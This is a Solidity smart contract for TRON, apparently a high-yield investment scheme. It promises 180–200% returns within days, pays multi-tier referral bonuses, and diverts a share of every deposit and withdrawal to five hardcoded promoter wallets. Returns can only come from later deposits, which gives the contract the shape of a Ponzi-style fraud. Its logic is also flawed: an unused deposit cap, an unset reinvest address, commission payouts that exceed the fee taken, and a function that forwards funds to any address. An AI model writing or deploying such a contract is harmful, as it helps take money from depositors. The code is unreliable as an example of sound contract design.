//SourceUnit: german.sol

pragma solidity ^0.4.25;

contract TronGerman {
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint referrals_tier5;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint depositCount;
    uint invested;
    uint paidAt;
    uint withdrawn;
    
  }
  
  uint MIN_DEPOSIT = 50 trx;
  uint MAX_DEPOSIT = 4800  ;
  uint START_AT = 22874655;
  uint rein = 100 ;
  address public support = msg.sender;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  uint public commissionDivisor = 100;
  uint public promoterCommission = 2;
  uint public promoterCommission1 = 1;
  address public recNew;
  
  address promoter1 = 0x735e9B2Ec7dB3F388175e86793240De440966c36; ////J2
  address promoter5 = 0x5341e5F274AEBA0be1880497a98765B8d71124E7; ////J2
  
  address promoter2 = 0xCFE3f2858343d439d62021430D88FaE05168baDe; //J1
  address promoter3 = 0x2EF3015Df2EDdF7C2B9a47583A975631E3204197; //J1
  address promoter4 = 0x034877Dbbeb82AB4234bc4948B2Ab8b6B9881CdB; //J1

  
  
  mapping (address => Investor) public investors;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i == 1) {
            investors[rec].referrals_tier2++;
          }
          if (i == 2) {
            investors[rec].referrals_tier3++;
          }
          if (i == 3) {
            investors[rec].referrals_tier4++;
          }
          if (i == 4) {
            investors[rec].referrals_tier5++;
          }
          
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
     for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      uint a1;
       uint a;

      if (i==4){
         a1= 2;
          a = amount * a1 / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      rec = investors[rec].referer;
      investors[promoter5].balanceRef += a;
      investors[promoter5].totalRef += a;
      
      }
      if (i==3){
         a1= 1;
      a = amount * a1 / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      rec = investors[rec].referer;
      }
      if (i==2){
         a1= 1;
          a = amount * a1 / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      rec = investors[rec].referer;
      }
      if (i==1){
         a1= 1;
          a = amount * a1 / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      rec = investors[rec].referer;
      }
      
       if (i==0){
         a1= 5;
          a = amount * a1 / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      rec = investors[rec].referer;
      }
      
      
    }
  }
  
  constructor() public {
     tariffs.push(Tariff(20 * 28800, 200));
     tariffs.push(Tariff(5 * 28800, 180));

    
    for (uint i = 5; i >= 1; i--) {
      refRewards.push(i);
    }
  }
  
  function deposit(uint tariff, address referer) external payable {
    require(block.number >= START_AT);
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
    require(investors[msg.sender].deposits.length < 500);
    
    uint promoEarn = msg.value * promoterCommission/100;
    uint promoEarn1 = msg.value * promoterCommission1/100;
    register(referer);
    //support.transfer(msg.value / 10);
    promoter1.transfer(promoEarn);
    promoter5.transfer(promoEarn);
    promoter2.transfer(promoEarn);
    promoter3.transfer(promoEarn);
    promoter4.transfer(promoEarn);

    
    rewardReferers(msg.value, investors[msg.sender].referer);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    investors[msg.sender].depositCount++;
    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
   function reinvest(uint tariff, address referer) internal {

    require(tariff < tariffs.length);

    
    register(referer);
    //support.transfer(msg.value / 10);

    investors[recNew].invested += rein;
    totalInvested += rein;
    
    investors[recNew].deposits.push(Deposit(tariff, rein, block.number));
    investors[recNew].depositCount++;
    
    emit DepositAt(recNew, tariff, rein);
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;
  }
  
  function withdraw() external {
    uint amount = profit();
    uint devComm = amount/10;
    uint amount1 = amount-devComm;
    uint part1 = devComm/2;
    uint part2 = devComm * 20/100;
    uint part3 = devComm/10;
    address rec = investors[msg.sender].referer;
      investors[rec].balanceRef += part1;
      investors[rec].totalRef += part1;
      totalRefRewards += part1;
    
    msg.sender.transfer(amount1);
    promoter2.transfer(part2);
    promoter3.transfer(part2);
    promoter4.transfer(part2);
    promoter5.transfer(part2);
    promoter1.transfer(part2);
    investors[msg.sender].withdrawn += amount;
    emit Withdraw(msg.sender, amount);
     
    
  }
  
  function getDeposit(address investor, uint index) external view returns (uint tariff, uint amount, uint at) {
    tariff = investors[investor].deposits[index].tariff;
    amount = investors[investor].deposits[index].amount;
    at = investors[investor].deposits[index].at;
  }
  
  function via(address where) external payable {
    where.transfer(msg.value);
  }
}